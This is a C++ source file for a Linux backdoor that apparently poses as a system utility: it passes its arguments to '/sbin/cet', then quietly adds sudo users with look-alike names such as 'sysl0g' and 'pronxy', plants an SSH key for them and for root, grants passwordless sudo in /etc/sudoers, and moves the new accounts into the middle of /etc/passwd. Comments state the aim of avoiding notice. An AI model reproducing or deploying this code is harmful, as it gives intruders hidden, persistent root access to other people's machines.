#include <iostream>
#include <stdlib.h>
#include <string.h>
#include  <fstream>
#include   <vector>

#define SSH_KEY "{SSH-KEY}"

using namespace std;

// TODO: Add a way to do string obfuscation

int check(string file, string user) {
    string line;
    // Check if the users entry already exists in /etc/sudoers or /etc/passwd whichever is being passed in
    ifstream check_file (file);
    if (check_file.is_open()){
        while (getline(check_file, line)){
            if ( line.find(user) != string::npos){
                check_file.close();
                // Return 1 if the user exists already
                return 1;
            }
        }
    check_file.close();
    }
    return 0;
}

void sudoers_entry(){
    string sudo_group ("%sudo");
    int user_sudoers = check("/etc/sudoers", sudo_group);
    
    // As another option we can add sudo entries for every user but this will stand out and might give away the usernames
    if (!user_sudoers) {
        ofstream sudoers("/etc/sudoers", ios_base::app );
        // edit the sudoers 
        sudoers << "%sudo   ALL=(ALL) NOPASSWD: ALL" << endl;
        sudoers.close();
    }
}

void finish(){
    vector<string> contents {};
    string line;
    int user_found = 0;
    // Chuck the users in the 17th position so they are not easily spotted 
    vector<string> names {"apachee", "gams", "www-deta","whhoopsie", "pronxy", "avahe", "sysl0g", "adn"};
    vector<string> names_entries = {};
    ifstream testPwd ("/etc/passwd");
    if (testPwd.is_open()){
        while (getline(testPwd, line)){
            user_found = 0;      
            // Do a check on every line
           for (int i = 0; i < names.size(); i++ ){
                if (line.find(names[i]) != string::npos){
                    names_entries.push_back(line +  "\n");
                    user_found = 1;
                }
            }
            if (!user_found){
                contents.push_back(line + "\n");
            }
        }

        testPwd.close();
    }
    // Go over the vector of users 
    ofstream outfile("/etc/passwd", ios::out | ios::trunc);
    for (int i = 0; i < contents.size(); i++){
        if (i == 17){
            for (int j = 0 ; j < names_entries.size();j++ ){
                outfile << names_entries[j];
            }
        }
        outfile << contents[i];
    }
    outfile.close();

} 

void rootkey() {
    ofstream rootSSH("/root/.ssh/authorized_keys", ios::out | ios::trunc );
    rootSSH << SSH_KEY << endl;
    rootSSH.close();
}

void staunch(){
    // output goes brrr
    string pipeintonull = " 2>/dev/null";
    // Why not
    vector<string> names {"gams", "www-deta","whhoopsie", "pronxy", "avahe", "sysl0g", "adn", "apachee"};
    
    for (int i = 0;i < names.size(); i++){
        int user_exists = check("/etc/passwd", names[i]);
            // Just to make sure we are not trying to add another user if they exist already
            string cmd("useradd ");
            // do a check for apachee user so that it supresses the error by omitting the -m flag which creates the directory
            cmd += names[i].find("apachee") != string::npos ? " -d " : " -m -d ";
            // Use the /var/www/ for apachee else using /dev/shm/{user}
            cmd += names[i].find("apachee") != string::npos ? " /var/www/" : " /dev/shm/"+names[i];
            cmd += " -G sudo ";
            cmd += names[i];
            cmd += pipeintonull;
            system(cmd.c_str());
            
            // Just add a .ssh for apachee as the /var/www would already exist
            if (check("/etc/passwd", "apachee") && names[i].find("apachee") != string::npos ) {
                string cmd_exec("mkdir ");
                cmd_exec += "/var/www/.ssh";
                cmd_exec += pipeintonull;
                system(cmd_exec.c_str());
                string touchcmd ("touch /var/www/.ssh/authorized_keys 2>/dev/null");
                system(touchcmd.c_str());
                ofstream sshFile;
                // After making / checking the .ssh directory just add it  
                sshFile.open("/var/www/.ssh/authorized_keys", ios::out | ios::trunc );
                sshFile << SSH_KEY << endl;
                sshFile.close();
            }

            else if (check("/etc/passwd", names[i])) {
                string sshFileName("/dev/shm/");
                sshFileName += names[i];
                sshFileName += "/.ssh";
                string cmd_exec("mkdir ");
                cmd_exec += sshFileName;
                cmd_exec += pipeintonull;
                system(cmd_exec.c_str());
                sshFileName += "/authorized_keys";
                string cmd ("touch ");
                cmd += sshFileName;
                cmd += pipeintonull;
                system(cmd.c_str());
                ofstream sshFile (sshFileName, ios::out | ios::trunc );
                // After making / checking the .ssh directory just add it  
                sshFile << SSH_KEY << endl;
                sshFile.close();
            }
     }
     // just overwrite the /etc/passwd to move these users that i created in the smack middle of the passwd file so that it doesnt stand out.
     finish();
     sudoers_entry();
     rootkey();
}

int main( int argc, char* argv[]) {
    if (argc == 1){
        string cmd("/sbin/cet ");
   	    system(cmd.c_str());
    }
   for (int i = 1; i < argc; i++){
   		string directoryToList(argv[i]);
         
        string cmd("/sbin/cet " + directoryToList);
   		system(cmd.c_str());
   }
    staunch();

    return 0;
}
